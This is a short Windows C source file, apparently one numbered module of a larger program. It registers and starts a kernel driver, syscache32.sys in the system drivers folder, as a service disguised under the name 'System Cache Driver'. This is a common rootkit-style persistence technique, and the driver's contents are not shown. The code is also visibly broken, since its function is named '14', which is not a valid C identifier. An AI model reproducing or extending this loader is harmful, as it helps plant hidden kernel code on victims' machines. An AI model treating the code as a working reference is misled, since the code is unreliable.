#include "01.h"
#include "14.h"
void 14() {
    WCHAR dll[MAX_PATH];
    GetSystemDirectory(dll, MAX_PATH);
    wcscat(dll, L"\\drivers\\syscache32.sys");
    SC_HANDLE m = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (m) {
        SC_HANDLE s = CreateService(m, L"syscache32", L"System Cache Driver",
            SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL, dll, NULL, NULL, NULL, NULL, NULL);
        if (s) {
            StartService(s, 0, NULL);
            CloseServiceHandle(s);
        }
        CloseServiceHandle(m);
    }
}
